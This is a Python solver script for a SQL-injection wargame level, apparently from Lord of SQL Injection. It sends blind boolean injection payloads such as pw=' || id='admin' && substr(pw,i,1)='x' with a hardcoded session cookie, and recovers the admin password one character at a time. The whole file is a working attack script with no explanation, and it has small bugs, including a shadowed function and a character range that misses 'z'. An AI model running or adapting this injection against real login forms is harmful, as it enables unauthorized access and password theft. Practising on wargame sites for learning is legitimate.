import requests
from bs4 import BeautifulSoup
import time

pw = ''

def requestURL(value):
    URL = "https://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?"
    cookie = {'session_id': '__cfduid=d6a13394428d2b6f71f1d9b8d59a768a81529951035; PHPSESSID=fpfrp4s04rdtm791791hgl0c72'}

    change_url = URL + value
    print(change_url)

    resp = requests.get(change_url, cookies=cookie)
    if resp.status_code == 200:
        soup = BeautifulSoup(resp.text, 'html.parser') # html code
        if soup.find_all(text='Hello admin'):
            global finish
            finish = 1 # find value
            time.sleep(1)
        else:
            finish = 0

        return finish

def find_pw(i, j, pw):
	parameter = "pw=' || id='admin' %26%26 substr(pw," + str(i) + ",1)='" + str(j)
	finish = requestURL(parameter)
	if finish == 1:
		pw += str(j)
		print(pw)

find_length = "pw=' || id='admin' %26%26 length%28pw%29='"
#for i in range(7,11):
 #   add = find_length + str(i)
  #  requestURL(add)
   # if finish == 1:
    #    break


for i in range(1, 9): #length
    for j in range(0, 10):
        find_pw = "pw=' || id='admin' %26%26 substr(pw," + str(i) + ",1)='" + str(j)
        finish = requestURL(find_pw)
        if finish == 1: # find
            pw += str(j)
            print(pw)
            break
        if j==9 and finish==0:
            for k in range(97, 122):
                find_pw = "pw=' || id='admin' %26%26 substr(pw," + str(i) + ",1)='" + chr(k)
                finish = requestURL(find_pw)
                if finish == 1:  # find
                    pw += chr(k)
                    print(pw)
                    break
        time.sleep(0.5)
    finish = 0

print(pw)